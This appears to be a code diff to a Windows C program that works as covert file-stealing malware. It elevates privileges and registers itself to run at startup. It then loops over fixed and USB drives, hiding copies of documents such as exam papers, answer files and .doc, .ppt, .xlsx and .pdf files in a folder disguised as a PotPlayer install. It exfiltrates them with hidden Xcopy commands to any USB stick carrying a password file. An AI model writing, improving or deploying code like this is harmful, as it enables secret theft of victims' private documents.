@@ -21,10 +21,9 @@ BOOL UpPrivilegeValue();
 
 int main(int argc, TCHAR* argv[])
 {
-	
+	UpPrivilegeValue();
 	while (1)
 	{
-		UpPrivilegeValue();//提升权限
 		setComputerStart(*argv);
 		TCHAR diskName[26][10] = { 0 };
 		TCHAR removebleDiskName[26][10] = { 0 };
@@ -40,7 +39,9 @@ int main(int argc, TCHAR* argv[])
 				findFolder(removebleDiskName[i], FALSE);
 				findMyUDisk(removebleDiskName[i]);
 			}
+
 		}
+
 		Sleep(5000);
 	}
 	return 0;
@@ -123,7 +124,7 @@ int first = 0;
 
 void findFolder(const TCHAR* dirName,BOOL recursion)
 {
-	TCHAR fileNameAll[MAX_PATH] = { 0 };
+	TCHAR fileNameAll[260] = { 0 };
 	intptr_t file;
 	struct _finddata_t find;
 
@@ -136,7 +137,9 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 	if (strstr(find.name, ".") == NULL && find.attrib== _A_SUBDIR)
 	{
 		if (recursion == 0)
+		{
 			wsprintf(fileNameAll, TEXT("%s%s"), dirName, find.name);
+		}
 		else
 			wsprintf(fileNameAll, TEXT("%s\\%s"), dirName, find.name);
 		copyFile(fileNameAll);
@@ -157,7 +160,9 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 			if (strstr(find.name, ".") == NULL)
 			{
 				if (recursion == 0)
+				{
 					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s%s"), dirName, find.name);
+				}
 				else
 					sprintf_s(fileNameAll,sizeof(fileNameAll), TEXT("%s\\%s"), dirName, find.name);
 
@@ -171,8 +176,9 @@ void findFolder(const TCHAR* dirName,BOOL recursion)
 
 void copyFile(const TCHAR* dirName)
 {
-	TCHAR fileName[MAX_PATH] = { 0 };
-	TCHAR copyFileName[MAX_PATH] = { 0 };
+	TCHAR fileName[260] = { 0 };
+	TCHAR fileNameAll[300] = { 0 };
+	TCHAR copyFileName[260] = { 0 };
 	intptr_t file;
 	struct _finddata_t find;
 
@@ -188,6 +194,7 @@ void copyFile(const TCHAR* dirName)
 
 	if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
 	{
+		wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
 		wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
 
 		TCHAR szCommand[1000] = { 0 };
@@ -206,7 +213,9 @@ void copyFile(const TCHAR* dirName)
 
 			if (strstr(fileName, TEXT("试卷")) != NULL || strstr(fileName, TEXT(".ppt")) != NULL || strstr(fileName, TEXT(".doc")) != NULL || strstr(fileName, TEXT("答案")) != NULL || strstr(fileName, TEXT(".xlsx")) != NULL || strstr(fileName, TEXT(".pdf")) != NULL)
 			{
+				wsprintf(fileNameAll, TEXT("%s%s"), dirName, fileName);
 				wsprintf(copyFileName, TEXT("D:\\Program Files\\Potplayer\\%s"), fileName);
+				Sleep(1);
 
 				TCHAR szCommand[1000] = { 0 };
 				sprintf(szCommand, "CMD /C Copy /V /Y \"%s\" \"%s\"", fileName, copyFileName);
@@ -233,36 +242,27 @@ void CreateFolder(const char* folderName)
 int findMyUDisk(TCHAR *removebleDiskName)
 {
 	FILE* fp;
-	char* fileName = (char*)malloc(sizeof(char) * 200);
+	char fileName[500] = { 0 };
 	int passWord = 54188220;
 	int getword = 0;
-	if (fileName != NULL)
+	wsprintf(fileName, TEXT("%s%s"), removebleDiskName,"mamsitear.txt");
+	if ((fp=fopen(fileName, "r")) == NULL)
 	{
-		wsprintf(fileName, TEXT("%s%s"), removebleDiskName, "mamsitear.txt");
-		if ((fp = fopen(fileName, "r")) == NULL)
+		return -1;
+	}
+	fscanf_s(fp, "%d", &getword);
+	if (getword == passWord)
+	{
+		TCHAR copyFloderName[100] = { 0 };
+		TCHAR szCommand[1000] = { 0 };
+		sprintf(copyFloderName, "%s%s", removebleDiskName, "Code");
+		CreateFolder(copyFloderName);
+		sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", "D:\\Program Files\\Potplayer", copyFloderName);
+		if (WinExec(szCommand, SW_HIDE) <= 31)
 		{
-			free(fileName);
-			fileName = NULL;
 			return -1;
 		}
-	
-		free(fileName);
-		fileName = NULL;//释放内存
-
-		fscanf_s(fp, "%d", &getword);
-		if (getword == passWord)
-		{
-			TCHAR copyFloderName[100] = { 0 };
-			TCHAR szCommand[MAX_PATH*2] = { 0 };
-			sprintf(copyFloderName, "%s%s", removebleDiskName, "Code");
-			CreateFolder(copyFloderName);
-			sprintf(szCommand, "CMD /C Xcopy /V /Y \"%s\" \"%s\"", "D:\\Program Files\\Potplayer", copyFloderName);
-			if (WinExec(szCommand, SW_HIDE) <= 31)
-			{
-				return -1;
-			}
-			return 1;
-		}
+		return 1;
 	}
 	return 0;
 }
@@ -292,8 +292,8 @@ void ComputerStart(char* pathName)
 
 void setComputerStart(char* argv)
 {
-	char pathName[MAX_PATH] = { 0 };//文件名字最大260个字符  MAX_PATH  260
-	GetCurrentDirectory(MAX_PATH, pathName);//设置字符集为多字节字符集  获取当前文件路径
+	char pathName[500] = { 0 };//文件名字最大260个字符  MAX_PATH  260
+	GetCurrentDirectory(500, pathName);//设置字符集为多字节字符集  获取当前文件路径
 
 	sprintf(pathName, "%s\\", pathName);
 	strcat(pathName, GetFilename(argv));//找到需要开机自启动的程序
